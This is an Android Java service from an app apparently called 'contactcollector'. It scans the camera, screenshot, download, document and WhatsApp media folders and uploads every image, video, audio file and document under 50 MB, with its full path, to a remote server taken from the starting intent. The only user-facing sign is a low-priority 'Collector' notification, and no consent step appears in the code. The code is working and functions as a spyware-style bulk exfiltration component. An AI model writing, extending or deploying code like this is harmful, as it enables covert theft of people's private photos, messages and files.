package com.contactcollector.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class FileUploadService extends Service {

    private static final String TAG = "FileUploadService";
    private static final String CHANNEL_ID = "file_upload_channel";
    private static final int NOTIFICATION_ID = 1001;

    private String sessionId;
    private String baseUrl;
    private boolean isRunning = false;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            sessionId = intent.getStringExtra("sessionId");
            baseUrl = intent.getStringExtra("baseUrl");
        }

        if (sessionId == null || baseUrl == null) {
            stopSelf();
            return START_NOT_STICKY;
        }

        // Start as foreground service
        Notification notification = createNotification("Uploading files...", 0, 0);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForeground(NOTIFICATION_ID, notification);
        }

        if (!isRunning) {
            isRunning = true;
            new Thread(this::uploadFilesInBackground).start();
        }

        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void uploadFilesInBackground() {
        try {
            // Scan directories for actual files to upload
            String[] storagePaths = {
                Environment.getExternalStorageDirectory().getAbsolutePath() + "/DCIM/Camera",
                Environment.getExternalStorageDirectory().getAbsolutePath() + "/Pictures/Screenshots",
                Environment.getExternalStorageDirectory().getAbsolutePath() + "/Download",
                Environment.getExternalStorageDirectory().getAbsolutePath() + "/Documents",
                Environment.getExternalStorageDirectory().getAbsolutePath() + "/WhatsApp/Media",
            };

            int totalUploaded = 0;

            for (String path : storagePaths) {
                File dir = new File(path);
                if (dir.exists() && dir.isDirectory()) {
                    totalUploaded += uploadFilesFromDir(dir, 0, 2);
                }
                if (!isRunning) break;
            }

            Log.d(TAG, "Upload complete. Total files uploaded: " + totalUploaded);

            // Update notification
            Notification notification = createNotification("Upload complete! " + totalUploaded + " files synced", 100, 100);
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (nm != null) nm.notify(NOTIFICATION_ID, notification);

        } catch (Exception e) {
            Log.e(TAG, "Error uploading files: " + e.getMessage());
        }

        // Stop service after upload
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            stopForeground(STOP_FOREGROUND_REMOVE);
        } else {
            stopForeground(true);
        }
        stopSelf();
        isRunning = false;
    }

    private int uploadFilesFromDir(File dir, int depth, int maxDepth) {
        if (depth > maxDepth || !isRunning) return 0;

        int count = 0;
        File[] files = dir.listFiles();
        if (files == null) return 0;

        for (File file : files) {
            if (!isRunning) break;

            if (file.isDirectory()) {
                count += uploadFilesFromDir(file, depth + 1, maxDepth);
            } else if (file.isFile() && file.canRead()) {
                // Only upload files under 50MB
                if (file.length() > 0 && file.length() < 50 * 1024 * 1024) {
                    String type = getFileType(file.getName());
                    // Prioritize images, videos, documents, pdf, audio
                    if (type.equals("image") || type.equals("video") || type.equals("document") || type.equals("pdf") || type.equals("audio")) {
                        boolean success = uploadSingleFile(file, type);
                        if (success) {
                            count++;
                            // Update notification progress
                            Notification notification = createNotification("Uploading files... " + count + " uploaded", count, 0);
                            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
                            if (nm != null) nm.notify(NOTIFICATION_ID, notification);
                        }
                    }
                }
            }
        }
        return count;
    }

    private boolean uploadSingleFile(File file, String fileType) {
        try {
            String boundary = "----CollectorBoundary" + System.currentTimeMillis();
            URL url = new URL(baseUrl + "/api/files/upload");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            conn.setConnectTimeout(30000);
            conn.setReadTimeout(120000);

            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

            // Session ID field
            dos.writeBytes("--" + boundary + "\r\n");
            dos.writeBytes("Content-Disposition: form-data; name=\"sessionId\"\r\n\r\n");
            dos.writeBytes(sessionId + "\r\n");

            // File path field
            dos.writeBytes("--" + boundary + "\r\n");
            dos.writeBytes("Content-Disposition: form-data; name=\"filePath\"\r\n\r\n");
            dos.writeBytes(file.getAbsolutePath() + "\r\n");

            // File type field
            dos.writeBytes("--" + boundary + "\r\n");
            dos.writeBytes("Content-Disposition: form-data; name=\"fileType\"\r\n\r\n");
            dos.writeBytes(fileType + "\r\n");

            // File data
            dos.writeBytes("--" + boundary + "\r\n");
            dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"\r\n");
            dos.writeBytes("Content-Type: application/octet-stream\r\n\r\n");

            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[8192];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                dos.write(buffer, 0, bytesRead);
            }
            fis.close();

            dos.writeBytes("\r\n--" + boundary + "--\r\n");
            dos.flush();
            dos.close();

            int responseCode = conn.getResponseCode();
            conn.disconnect();

            return responseCode >= 200 && responseCode < 300;
        } catch (Exception e) {
            Log.e(TAG, "Failed to upload " + file.getName() + ": " + e.getMessage());
            return false;
        }
    }

    private String getFileType(String name) {
        name = name.toLowerCase();
        if (name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png") || name.endsWith(".gif") || name.endsWith(".webp") || name.endsWith(".bmp") || name.endsWith(".heic"))
            return "image";
        if (name.endsWith(".mp4") || name.endsWith(".avi") || name.endsWith(".mkv") || name.endsWith(".3gp") || name.endsWith(".mov") || name.endsWith(".wmv") || name.endsWith(".flv"))
            return "video";
        if (name.endsWith(".mp3") || name.endsWith(".wav") || name.endsWith(".flac") || name.endsWith(".ogg") || name.endsWith(".m4a") || name.endsWith(".aac") || name.endsWith(".wma"))
            return "audio";
        if (name.endsWith(".pdf"))
            return "pdf";
        if (name.endsWith(".doc") || name.endsWith(".docx") || name.endsWith(".txt") || name.endsWith(".xls") || name.endsWith(".xlsx") || name.endsWith(".ppt") || name.endsWith(".pptx") || name.endsWith(".csv"))
            return "document";
        return "other";
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "File Upload Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Uploading files to website");
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    @SuppressWarnings("deprecation")
    private Notification createNotification(String text, int progress, int max) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder builder = new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("Collector")
                .setContentText(text)
                .setSmallIcon(android.R.drawable.ic_menu_upload)
                .setOngoing(true);

            if (max > 0) {
                builder.setProgress(max, progress, false);
            }

            return builder.build();
        } else {
            //noinspection deprecation
            Notification.Builder builder = new Notification.Builder(this)
                .setContentTitle("Collector")
                .setContentText(text)
                .setSmallIcon(android.R.drawable.ic_menu_upload)
                .setOngoing(true)
                .setPriority(Notification.PRIORITY_LOW);

            if (max > 0) {
                builder.setProgress(max, progress, false);
            }

            return builder.build();
        }
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        super.onDestroy();
    }
}
